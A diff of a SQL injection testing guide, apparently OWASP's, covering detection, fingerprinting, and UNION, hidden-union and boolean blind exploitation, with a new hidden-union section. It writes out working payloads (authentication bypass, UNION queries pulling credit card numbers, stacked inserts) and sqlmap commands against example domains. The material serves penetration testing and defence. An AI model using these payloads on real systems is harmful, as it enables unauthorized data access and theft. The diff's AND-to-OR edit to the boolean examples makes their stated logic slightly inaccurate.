@@ -6,35 +6,37 @@
 
 ## Summary
 
-SQL injection testing checks if it is possible to inject data into the application so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. A successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database.
+SQL injection testing checks if it is possible to inject data into an application/site so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. Successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database, which if you didn't know already is quite bad.
 
-An [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
+An [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.
 
-In general the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:
+In general, the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:
 
 `select title, text from news where id=$id`
 
 In the example above the variable `$id` contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.
 
-Because the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user's choice. The example below illustrates the user-supplied data "10 or 1=1", changing the logic of the SQL statement, modifying the WHERE clause adding a condition "or 1=1".
+Because of the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user's choice. The example below illustrates the user-supplied data "10 or 1=1", changing the logic of the SQL statement, modifying the WHERE clause adding a condition "or 1=1".
 
 `select title, text from news where id=10 or 1=1`
 
+> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.
+
 SQL Injection attacks can be divided into the following three classes:
 
-- Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.
+- Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward attack, in which the retrieved data is presented directly in the application web page.
 - Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).
-- Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.
+- Inferential or Blind: there is no actual transfer of data. Still, the tester can reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.
 
 A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.
 
-About the techniques to exploit SQL injection flaws there are five commons techniques. Also those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):
+About the techniques to exploit SQL injection flaws, there are five common techniques. Also, those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):
 
 - Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
 - Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.
-- Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
-- Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).
-- Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.
+- Error-based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
+- Out-of-band: the technique used to retrieve data using a different channel (e.g., make an HTTP connection to send the results to a web server).
+- Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when the attacker doesn’t have some answer (result, output, or error) from the application.
 
 ## Test Objectives
 
@@ -45,13 +47,13 @@ About the techniques to exploit SQL injection flaws there are five commons techn
 
 ### Detection Techniques
 
-The first step in this test is to understand when the application interacts with a DB Server in order to access some data. Typical examples of cases when an application needs to talk to a DB include:
+The first step in this test is to understand when the application interacts with a DB Server to access some data. Typical examples of cases, when an application needs to talk to a DB, include:
 
 - Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).
-- Search engines: the string submitted by the user could be used in a SQL query that extracts all relevant records from a database.
+- Search engines: the string submitted by the user could be used in an SQL query that extracts all relevant records from a database.
 - E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.
 
-The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.
+The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests, and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.
 
 The very first test usually consists of adding a single quote `'` or a semicolon `;` to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):
 
@@ -71,9 +73,9 @@ varchar value 'test' to a column of data type int.
 /target/target.asp, line 113
 ```
 
-Monitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester in order to mount a successful injection attack. However, applications often do not provide so much detail: a simple '500 Server Error' or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the other remain constant, in order to precisely understand which parameters are vulnerable and which are not.
+Monitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester to mount a successful injection attack. However, applications often do not provide so much detail: a simple '500 Server Error' or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the others remain constant, in order to precisely understand which parameters are vulnerable and which are not.
 
-### Standard SQL Injection Testing
+### Standard SQL Injection Testing Methods
 
 #### Classic SQL Injection
 
@@ -81,7 +83,7 @@ Consider the following SQL query:
 
 `SELECT * FROM Users WHERE Username='$username' AND Password='$password'`
 
-A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:
+A similar query is generally used from the web application to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to log-in to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:
 
 `$username = 1' or '1' = '1`
 
@@ -91,19 +93,21 @@ The query will be:
 
 `SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`
 
-If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable web site is www.example.com, the request that we'll carry out will be:
+> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.
 
-`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`
+If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable site is `www.example.com`, the request that we'll carry out will be:
 
-After a short analysis we notice that the query returns a value (or a set of values) because the condition is always true (`OR 1=1`). In this way the system has authenticated the user without knowing the username and password.
+`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`
 
-> Note: In some systems the first row of a user table would be an administrator user. This may be the profile returned in some cases.
+After a short analysis, we notice that the query returns a value (or a set of values) because the condition is always true (`OR 1=1`). In this way, the system has authenticated the user without knowing the username and password.
+
+> Note: In some systems, the first row of a user table would be an administrator user. This may be the profile returned in some cases.
 
 Another example query is the following:
 
 `SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`
 
-In this case, there are two problems, one due to the use of the parentheses and one due to the use of MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding a number of closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol for the greater majority of databases is `/*`. In Oracle the symbol is `--`. This said, the values that we'll use as Username and Password are:
+In this case, there are two problems, one due to the use of the parentheses and one due to the use of the MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding some closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such a symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol for the greater majority of databases is `/*`. In Oracle, the symbol is `--`. This said the values that we'll use as Username and Password are:
 
 `$username = 1' or '1' = '1'))/*`
 
@@ -117,9 +121,9 @@ In this way, we'll get the following query:
 
 The request URL will be:
 
-`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`
+`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`
 
-This may return a number of values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). In order to get around this problem, it is enough to insert a SQL command that imposes a condition that the number of the returned results must be one (one record returned). In order to reach this goal, we use the operator `LIMIT <num>`, where `<num>` is the number of the results/records that we want to be returned. With respect to the previous example, the value of the fields Username and Password will be modified as follows:
+This may return some values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). To get around this problem, it is enough to insert an SQL command that imposes a condition that the number of the returned results must be one (one record returned). To reach this goal, we use the operator `LIMIT <num>`, where `<num>` is the number of the results/records that we want to be returned. Concerning the previous example, the value of the fields Username and Password will be modified as follows:
 
 `$username = 1' or '1' = '1')) LIMIT 1/*`
 
@@ -127,7 +131,7 @@ This may return a number of values. Sometimes, the authentication code verifies 
 
 In this way, we create a request like the following:
 
-`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`
+`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`
 
 #### SELECT Statement
 
@@ -135,25 +139,25 @@ Consider the following SQL query:
 
 `SELECT * FROM products WHERE id_product=$id_product`
 
-Consider also the request to a script who executes the query above:
+Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
-When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is play with logic, using the operators AND and OR.
+When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is to play with logic, using the operators AND and OR.
 
 Consider the request:
 
-`http://www.example.com/product.php?id=10 AND 1=2`
+`https://www.example.com/product.php?id=10 AND 1=2`
 
 `SELECT * FROM products WHERE id_product=10 AND 1=2`
 
 In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:
 
-`http://www.example.com/product.php?id=10 AND 1=1`
+`https://www.example.com/product.php?id=10 AND 1=1`
 
 #### Stacked Queries
 
-Depending on the API which the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.
+Depending on the API that the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.
 
 Consider the following SQL query:
 
@@ -161,19 +165,19 @@ Consider the following SQL query:
 
 A way to exploit the above scenario would be:
 
-`http://www.example.com/product.php?id=10; INSERT INTO users (…)`
+`https://www.example.com/product.php?id=10; INSERT INTO users (…)`
 
 This way is possible to execute many queries in a row and independent of the first query.
 
 ### Fingerprinting the Database
 
-Even though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, functions to retrieve data such as users names and databases, features, comments line etc.
+Even though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, and functions to retrieve data such as users' names and databases, features, comments lines, etc.
 
-When the testers move to a more advanced SQL injection exploitation they need to know what the back end database is.
+When the testers move to a more advanced SQL injection exploitation they need to know what the backend database is.
 
 #### Errors Returned by the Application
 
-The first way to find out what back end database is used is by observing the error returned by the application. The following are some examples of error messages:
+The first way to find out what backend database is used is by observing the error returned by the application. The following are some examples of error messages:
 
 MySql:
 
@@ -183,7 +187,7 @@ that corresponds to your MySQL server version for the
 right syntax to use near '\'' at line 1
 ```
 
-One complete UNION SELECT with version() can also help to know the back end database.
+One complete UNION SELECT with version() can also help to know the backend database.
 
 `SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`
 
@@ -207,7 +211,7 @@ Query failed: ERROR: syntax error at or near
 "’" at character 56 in /www/site/test.php on line 121.
 ```
 
-If there is no error message or a custom error message, the tester can try to inject into string fields using varying concatenation techniques:
+If there is no error message or a custom error message, the tester can try to inject it into string fields using varying concatenation techniques:
 
 - MySql: ‘test’ + ‘ing’
 - SQL Server: ‘test’ ‘ing’
@@ -218,7 +222,7 @@ If there is no error message or a custom error message, the tester can try to in
 
 #### Union Exploitation Technique
 
-The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose for our examples that the query executed from the server is the following:
+The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose, for our example, that the query executed from the server is the following:
 
 `SELECT Name, Phone, Address FROM Users WHERE Id=$id`
 
@@ -230,21 +234,21 @@ We will have the following query:
 
 `SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`
 
-Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword `ALL` is necessary to get around queries that use the keyword `DISTINCT`. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns in order to avoid a syntax error.
+Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword `ALL` is necessary to get around queries that use the keyword `DISTINCT`. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns to avoid a syntax error.
 
-The first detail a tester needs to exploit the SQL injection vulnerability using such technique is to find the right numbers of columns in the SELECT statement.
+The first detail a tester needs to find to exploit the SQL injection vulnerability using this technique is the right number of columns in the SELECT statement.
 
-In order to achieve this the tester can use `ORDER BY` clause followed by a number indicating the numeration of database’s column selected:
+To achieve this, the tester can use the `ORDER BY` clause followed by a number indicating the numeration of the database’s column selected:
 
-`http://www.example.com/product.php?id=10 ORDER BY 10--`
+`https://www.example.com/product.php?id=10 ORDER BY 10--`
 
-If the query executes with success the tester can assume, in this example, there are 10 or more columns in the `SELECT` statement. If the query fails then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:
+If the query executes with success, the tester can assume in this example that there are 10 or more columns in the `SELECT` statement. If the query fails, then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:
 
 `Unknown column '10' in 'order clause'`
 
-After the tester finds out the numbers of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:
+After the tester finds out the number of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:
 
-`http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`
+`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`
 
 If the query fails, the tester will probably see a message like:
 
@@ -252,41 +256,266 @@ If the query fails, the tester will probably see a message like:
 
 If the query executes with success, the first column can be an integer. Then the tester can move further and so on:
 
-`http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`
+`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`
 
-After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a `LIMIT` clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database which ID is 99999):
+After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a `LIMIT` clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database that has an ID that equals 99999):
 
-`http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`
+`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`
+
+#### Hidden Union Exploitation Technique
+
+It’s best when you can exploit a SQL injection with the [union technique](#union-exploitation-technique) because you can retrieve the result of your query in one request.  
+But most of the SQL injections in the wild are blind. Yet, you can turn some of them into union-based injections.
+
+**Identification**  
+Either of the following methods can be used to identify these SQL injections:
+
+1. The vulnerable query returns data, but the injection is blind.
+2. The `ORDER BY` technique works, but you can't achieve a union-based injection.
+
+**Root Cause**  
+The reason you can’t use the usual Union techniques is the complexity of the vulnerable query. In the Union Technique, you comment on the rest of the query after your `UNION` payload. It's fine for normal queries, but in more complicated queries it can be problematic. If the first part of the query depends on the second part of it, commenting on the rest of it breaks the original query.  
+
+**Scenario 1**  
+The vulnerable query is a sub-query, and the parent query handles returning the data.
+
+```text
+SELECT 
+  * 
+FROM 
+  customers 
+WHERE 
+  id IN (                 --\
+    SELECT                   |
+      DISTINCT customer_id   |
+    FROM                     |
+      orders                 |--> vulnerable query
+    WHERE                    |
+      cost > 200             |
+  );                      --/
+```
+
+- _Problem:_ If you inject a `UNION` payload, it doesn't affect the returned data. Because you are modifying the `WHERE` section. In fact, you are not appending a `UNION` query to the original query.  
+- _Solution:_ You need to know the query which gets executed in the backend. Then, create your payload based on that. It means closing open parentheses or adding proper keywords if needed.
+
+**Scenario 2**  
+The vulnerable query contains aliases or variable declarations.
+
+```text
+SELECT 
+  s1.user_id, 
+  (                                                                                      --\
+    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
+  ) AS overlap                                                                           --/
+FROM 
+  subscriptions AS s1 
+  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
+  AND s1.start_date <= s2.end_date 
+  AND s1.end_date >= s2.start_date 
+GROUP BY 
+  s1.user_id
+```
+
+- _Problem:_ You break the query when you comment the rest of the original query after your injected payload because some aliases or variables become `undefined`.  
+- _Solution:_ You need to put appropriate keywords or aliases at the beginning of your payload. this way the first part of the original query stays valid.
+
+**Scenario 3**  
+The result of the vulnerable query is being used in a second query. The second query returns the data, not the first one.
+
+```text
+<?php
+// retrieves product ID based on product name
+                            --\
+$query1 = "SELECT              |
+             id                |
+           FROM                |
+             products          |--> vulnerable query #1
+           WHERE               |
+             name = '$name'";  |
+                            --/
+$result1 = odbc_exec($conn, $query1);
+// retrieves product's comments based on the product ID
+                              --\
+$query2 = "SELECT                |
+             comments            |
+           FROM                  |
+             products            |--> vulnerable query #2
+           WHERE                 |
+             id = '$result1'";   |
+                              --/
+$result1 = odbc_exec($conn, $query2);
+?>
+```
+
+- _Problem:_ You can add a `UNION` payload to the first query but it won't affect the returned data.  
+- _solution:_ You need to inject in the second query. So the input to the second query should not get sanitized. Then, you need to make the first query return no data. Now append a `UNION` query that returns the payload you want to inject in the _second query_.
+  
+  **Example:**  
+  The base of the payload (what you inject in the first query):
+
+  ```text
+  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
+  ```
+
+  The `PAYLOAD` is what you want to inject in the _second query_:
+  
+  ```text
+  ' AND 1=2 UNION SELECT ...
+  ```
+
+  The final payload (after replacing the `PAYLOAD`):
+
+  ```text
+  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
+                            \________________________/
+                                        ||
+                                        \/
+                                 the payload that
+                                  get's injected
+                               into the second query
+  \________________________________________________________/
+                              ||
+                              \/
+   the actual query we inject into the vulnerable parameter
+  ```
+
+  The first query after injection:
+
+  ```text
+  SELECT               --\
+    id                    |
+  FROM                    |----> first query
+    products              |
+  WHERE                   |
+    name = 'abcd'      --/
+    AND 1 = 2                                 --\
+  UNION                                          |----> injected payload (what gets injected into the second payload)
+  SELECT                                         |
+    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
+  ```
+
+  The second query after injection:
+
+  ```text
+  SELECT            --\
+    comments           |
+  FROM                 |----> second query
+    products           |
+  WHERE                |
+    id = ''         --/
+    AND 1 = 2         --\ 
+  UNION                  |----> injected payload (the final UNION query that controls the returned data)
+  SELECT ... -- -'    --/
+  ```
+
+**Scenario 4**  
+The vulnerable parameter is being used in several independent queries.
+
+```text
+<?php
+//retrieving product details based on product ID
+$query1 = "SELECT 
+             name, 
+             inserted, 
+             size 
+           FROM 
+             products 
+           WHERE 
+             id = '$id'";
+$result1 = odbc_exec($conn, $query1);
+//retrieving product comments based on the product ID
+$query2 = "SELECT 
+             comments 
+           FROM 
+             products 
+           WHERE 
+             id = '$id'";
+$result2 = odbc_exec($conn, $query2);
+?>
+```
+
+- _Problem:_ Appending a `UNION` query to the first (or second) query doesn't break it, but it may break the other one.  
+- _Solution:_ It depends on the code structure of the application. But the first step is to know the original query. Most of the time, these injections are time-based. Also, the time-based payload gets injected in several queries which can be problematic.  
+  For example, if you use `SQLMap`, this situation confuses the tool and the output gets messed up. Because the delays will not be as expected.  
+
+**Extracting Original Query**  
+As you see, knowing the original query is always needed to achieve a union-based injection.  
+You can retrieve the original query using the default DBMS tables:
+
+| DBMS                 | Table                          |
+|----------------------|--------------------------------|
+| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
+| PostgreSQL           | pg_stat_activity               |
+| Microsoft SQL Server | sys.dm_exec_cached_plans       |
+| Oracle               | V$SQL                          |
+
+**Automation**  
+Steps to automate the workflow:
+
+1. Extract the original query using `SQLMap` and blind injection.
+2. Build a base payload according to the original query and achieve union-based injection.
+3. Automate the exploitation of the union-based injection by one of these options:  
+    - Specifying a _custom injection point marker_ (`*`)
+    - Using `--prefix` and `--suffix` flags.
+
+**Example:**  
+Consider the third scenario discussed above.  
+We assume the DMBS is `MySQL` and the first and second queries return only one column.
+This can be your payload for extracting the version of the database:
+
+```text
+' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
+```
+
+So the target URL would be like this:
+
+```text
+https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
+```
+
+Automation:  
+
+- _custom injection point marker_ (`*`):
+
+  ```text
+  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
+  ```
+
+- `--prefix` and `--suffix` flags:
+
+  ```text
+  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
+  ```
 
 #### Boolean Exploitation Technique
 
-The Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known on the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything on the structure of the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, or redirect).
+The Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything about the structure of the query or the database. (The page does not return a SQL error, it may just return an HTTP 500, 404, or redirect).
 
-By using inference methods, it is possible to avoid this obstacle and thus to succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. We consider, as always, the www.example.com domain and we suppose that it contains a parameter named `id` vulnerable to SQL injection. This means that carrying out the following request:
+By using inference methods, it is possible to avoid this obstacle and thus succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers, and finally deducing the meaning of such answers. We consider, as always, the `www.example.com` domain and we suppose that it contains a parameter named `id` vulnerable to SQL injection. This means that when carrying out the following request:
 
-`http://www.example.com/index.php?id=1'`
+`https://www.example.com/index.php?id=1'`
 
-We will get one page with a custom message error which is due to a syntactic error in the query. We suppose that the query executed on the server is:
+We will get one page with a custom error message which is due to a syntactic error in the query. We suppose that the query executed on the server is:
 
 `SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`
 
-Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our examples, we will use the following pseudo-functions:
+Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our example, we will use the following pseudo-functions:
 
-- SUBSTRING (text, start, length): returns a substring starting from the position "start" of text and of length "length". If "start" is greater than the length of text, the function returns a null value.
+- SUBSTRING (text, start, length): returns a substring starting from the position "start" of text and length "length". If "start" is greater than the length of text, the function returns a null value.
 
-- ASCII (char): it gives back ASCII value of the input character. A null value is returned if char is 0.
+- ASCII (char): it gives back the ASCII value of the input character. A null value is returned if char is 0.
 
 - LENGTH (text): it gives back the number of characters in the input text.
 
-Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, in order to select only one character at a time (selecting a single character means to impose the length parameter to 1), and the function ASCII, in order to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table, until the right value is found. As an example, we will use the following value for `Id`:
+Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass it to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, to select only one character at a time (selecting a single character means imposing the length parameter to 1), and the function ASCII, to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table until the right value is found. As an example, we will use the following value for `Id`:
 
-`$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`
+`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`
 
 That creates the following query (from now on, we will call it "inferential query"):
 
-`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`
+`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`
 
-The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set to zero the index of the ASCII table and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for `Id`:
+The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set the index of the ASCII table to zero and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for `Id`:
 
 `$Id=1' AND '1' = '2`
 
@@ -294,17 +523,17 @@ Which will create the following query:
 
 `SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`
 
-The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and to obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates in order to decide the result of the test.
+The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates to decide the result of the test.
 
-In the previous discussion, we haven't dealt with the problem of determining the termination condition for our tests, i.e., when we should end the inference procedure. A techniques to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e., the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.
+In the previous discussion, we haven't dealt with the problem of determining the termination condition for our tests, i.e. when we should end the inference procedure. A technique to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e. the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.
 
 We will insert the following value for the field `Id`:
 
-`$Id=1' AND LENGTH(username)=N AND '1' = '1`
+`$Id=1' OR LENGTH(username)=N AND '1' = '1`
 
